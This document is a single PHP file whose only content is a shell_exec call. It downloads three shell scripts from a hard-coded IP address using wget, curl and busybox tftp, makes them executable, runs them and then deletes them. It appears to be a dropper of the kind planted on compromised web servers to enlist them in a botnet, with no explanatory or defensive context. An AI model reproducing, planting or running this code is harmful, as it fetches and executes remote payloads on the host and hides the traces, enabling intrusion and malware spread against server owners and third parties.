<?php
	shell_exec("cd /tmp; wget http://149.91.80.151/gtop.sh || curl -O http://149.91.80.151/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 149.91.80.151 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 149.91.80.151; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh");
?>